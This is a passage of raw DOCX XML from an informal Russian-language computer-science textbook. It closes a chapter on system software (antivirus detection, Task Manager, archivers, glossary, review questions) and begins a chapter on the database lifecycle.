      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Антивирус рассчитал хеш файла (например, SHA-256): `a3f5c9d7e2b8...`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сравнил с базой известных вирусов.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Совпадение найдено: `Trojan:Win32/FakeInvoice`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Файл заблокирован.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. Эвристический анализ:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Антивирус проанализировал поведение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Файл называется `invoice.pdf.exe` (двойное расширение — подозрительно).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Иконка замаскирована под PDF (трюк для обмана пользователя).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Файл пытается подключиться к серверу в Китае (C&amp;C server, command and control).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Файл пытается изменить системный реестр Windows.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Антивирус решил: это вирус.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Файл заблокирован, помещён в карантин.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Антивирусы используют сигнатуры (известные вирусы) и эвристику (подозрительное поведение).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: Использование диспетчера задач</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Компьютер тормозит. Как найти, что жрёт ресурсы?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Открыл **Task Manager** (Ctrl+Shift+Esc в Windows).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Вкладка **Processes** (Процессы).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Отсортировал по столбцу **CPU** (нагрузка на процессор).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Процесс `chrome.exe` жрёт 95% CPU.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Кликнул правой кнопкой → **End Task** (Завершить задачу).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Chrome закрылся → CPU разгрузился до 5%.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Альтернатива:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Отсортировал по столбцу </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Memory</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (память). Процесс `chrome.exe` жрёт 8 GB из 16 GB RAM. Завершил процесс → освободилось 8 GB.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Диспетчер задач — первый инструмент для диагностики тормозов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 5: Архивация данных (7z vs ZIP)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Папка с исходным кодом проекта (10,000 файлов, 500 MB). Нужно заархивировать для отправки по почте. Сравни ZIP и 7z.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ZIP (Deflate):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сжатие: 500 MB → 150 MB (коэффициент 3.3x).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Время: 30 секунд.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Совместимость: все ОС, любой архиватор откроет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>7z (LZMA):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сжатие: 500 MB → 80 MB (коэффициент 6.25x).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Время: 2 минуты.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Совместимость: нужен 7-Zip или аналог.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если важна скорость и совместимость → ZIP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если важен размер (медленный интернет, лимит на размер письма) → 7z.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Практика:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Исходный код (текстовые файлы, много повторений) сжимается отлично (6-10x).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фотографии (JPEG уже сжат) сжимаются плохо (1.05-1.2x, почти без толку).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Системное программное обеспечение (системное ПО)** — набор программ для управления аппаратными ресурсами и обеспечения платформы для выполнения прикладных программ.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Драйвер устройства (Device Driver)** — программа для управления конкретным устройством (видеокарта, принтер, диск, сетевая карта).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Kernel-mode driver (драйвер режима ядра)** — драйвер, работающий в привилегированном режиме (полный доступ к железу, но опасен — ошибка = BSOD).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**User-mode driver (драйвер пользовательского режима)** — драйвер, работающий как обычная программа (безопаснее, но медленнее).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Blue Screen of Death (BSOD)** — критическая ошибка Windows, вызванная багом в ядре или драйвере (синий экран с текстом ошибки).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Kernel panic** — критическая ошибка Linux/macOS, аналог BSOD.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Системные утилиты** — программы для управления и обслуживания системы (диспетчер задач, дефрагментация, архиваторы, антивирусы).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Диспетчер задач (Task Manager)** — утилита для мониторинга процессов, CPU/RAM/диска/сети, завершения зависших программ.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Диспетчер дисков (Disk Management)** — утилита для управления разделами дисков (создание, форматирование, изменение размера).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Реестр Windows (Registry)** — централизованная база данных настроек ОС и программ.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Дефрагментация (Defragmentation)** — процесс упорядочивания файлов на HDD (для SSD не нужна и вредна).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**TRIM** — команда для SSD, сообщающая, какие блоки данных больше не используются (оптимизация записи).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Резервное копирование (Backup)** — создание копии данных на случай сбоя (правило 3-2-1: 3 копии, 2 носителя, 1 офлайн).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Архиватор** — программа для сжатия файлов (WinRAR, 7-Zip, gzip, tar).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Антивирус** — программа для защиты от вредоносного ПО (вирусы, трояны, шифровальщики).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сигнатура вируса** — уникальный отпечаток (fingerprint) известного вируса в базе данных антивируса.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Эвристический анализ** — метод обнаружения вирусов по подозрительному поведению (без сигнатуры).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Песочница (Sandbox)** — изолированная среда для запуска подозрительных программ (защита системы).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Файловый менеджер** — программа для управления файлами и папками (копирование, перемещение, удаление).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория:** Назови три категории системного ПО и приведи по два примера для каждой. Почему системное ПО критично для работы компьютера?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Драйверы:** В чём разница между kernel-mode драйвером (видеокарта) и user-mode драйвером (принтер)? Почему баг в драйвере видеокарты может вызвать BSOD, а баг в драйвере принтера — нет?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практика:** Компьютер тормозит. Открыл Task Manager, процесс `chrome.exe` жрёт 100% CPU и 10 GB RAM. Что делать? Опиши последовательность действий. Почему Chrome создаёт десятки процессов?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Дефрагментация:** У тебя два диска: HDD 1 TB (фрагментирован на 40%) и SSD 500 GB. Нужно ли дефрагментировать каждый из них? Объясни, почему дефрагментация SSD вредна. Что такое TRIM и зачем он нужен?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Антивирусы:** Скачал файл `photo.jpg.exe`. Антивирус заблокировал. Как он понял, что это вирус? Опиши два метода обнаружения: сигнатуры и эвристический анализ. Почему zero-day вирусы опасны?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итог:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Системное программное обеспечение — это фундамент, без которого компьютер бесполезен. Операционная система управляет процессами и памятью, драйверы переводят команды ОС в инструкции для устройств, системные утилиты поддерживают систему в рабочем состоянии. Kernel-mode драйверы опасны (ошибка = BSOD), но быстры. User-mode драйверы безопасны, но медленнее. Дефрагментация полезна для HDD, но вредна для SSD (используй TRIM). Антивирусы защищают от вирусов через сигнатуры и эвристику, но Windows Defender (2025) уже достаточно хорош. Архиваторы сжимают данные (7z лучше ZIP, но медленнее). Делай бэкапы по правилу 3-2-1, чтобы не потерять всё при крахе.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Следующая глава (4.1) — Жизненный цикл баз данных. Переходим к разделу 4 (Модели решения задач). Впереди — алгоритмы, программирование, базы данных, и сети.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 4.1: Жизненный цикл баз данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Итак, разобрались с железом (раздел 2), софтом (раздел 3), и теперь пора говорить о том, как решать реальные задачи. База данных — это не просто "создал табличку, закинул данные и радуешься". Это целая жизнь: от идеи до смерти (ну, или миграции на что-то новое).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Жизненный цикл базы данных (Database Lifecycle, DBLC)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это все этапы существования БД: от момента, когда кто-то сказал "блин, нам нужна база", до момента "всё, выключаем, переезжаем на MongoDB" (или наоборот).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава связана с:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 7.2** (Понятие база данных) — там мы ещё вернёмся к БД подробнее</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 7.3** (Реляционные БД) — когда будем проектировать таблицы, вспомним нормализацию</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 4.2** (Информационные модели) — моделирование предметной области</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если ты думаешь, что БД живут вечно — ты ошибаешься. Средний срок жизни корпоративной БД — 5-10 лет. Потом либо переписывают, либо мигрируют, либо просто выключают нахрен и делают заново.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1.1. Что такое жизненный цикл БД</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Жизненный цикл базы данных (DBLC)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это последовательность этапов от зарождения идеи создания БД до её вывода из эксплуатации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> представь, что БД — это здание. Жизненный цикл:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Анализ требований** — "Нам нужен магазин на 100 человек с парковкой"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Проектирование** — рисуем план здания (где стены, окна, туалеты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Реализация** — строим (заливаем фундамент, ставим стены)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Заполнение данными** — завозим товары на полки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Тестирование** — проверяем, не течёт ли крыша, работают ли двери</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Эксплуатация** — магазин работает, люди покупают</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Поддержка** — меняем лампочки, чиним сломанное, расширяем склад</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Вывод из эксплуатации** — сносим здание или перестраиваем в офис</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Без чёткого понимания жизненного цикла получается хаос: начинаешь строить без плана, потом всё переделываешь, база работает криво, данные теряются, а заказчик орёт.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1.2. Фазы жизненного цикла БД</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Классическая модель жизненного цикла БД включает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>8 основных фаз</w:t>
      </w:r>
      <w:r>
        <w:t>. Погнали по порядку.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Фаза 1: Анализ требований (Requirements Analysis)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делаем:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Выясняем, что вообще нужно. Разговариваем с заказчиком, пользователями, бизнесом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопросы, которые задаём:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какие данные хранить? (товары, пользователи, заказы, платежи?)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сколько данных? (100 записей или 100 миллионов?)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кто будет работать с БД? (один админ или 10 тысяч пользователей одновременно?)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какие операции? (только чтение или постоянная запись?)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какие требования к скорости? (можно подождать секунду или нужен ответ за 10 мс?)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какие требования к надёжности? (потеря данных = конец света или "ну ладно"?)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы требований:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Функциональные</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — что должна делать БД:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хранить информацию о товарах (название, цена, количество)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Регистрировать заказы пользователей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вести историю покупок</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддерживать поиск по названию товара</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Нефункциональные</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — как должна работать БД:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Время отклика запроса: не более 100 мс</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Доступность: 99.9% (не больше 8 часов простоя в год)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Безопасность: шифрование личных данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Масштабируемость: должна поддерживать рост до 1 млн пользователей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1: Интернет-магазин (анализ требований)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Заказчик:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> "Хочу интернет-магазин для продажи носков."</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналитик:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> "Окей, а что конкретно нужно?"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Требования:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хранить каталог товаров (название, цена, артикул, количество на складе, фото)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Регистрация пользователей (email, пароль, адрес доставки)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оформление заказов (корзина, оплата, доставка)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>История заказов пользователя</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Админ-панель (добавление товаров, управление заказами)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оценка объёма:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Товаров: 500 позиций (на старте), рост до 10 000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователей: 10 000 (на старте), рост до 100 000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Заказов: ~100 в день (~36 000 в год)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Нефункциональные требования:</w:t>
      </w:r>
    </w:p>
    <w:p>
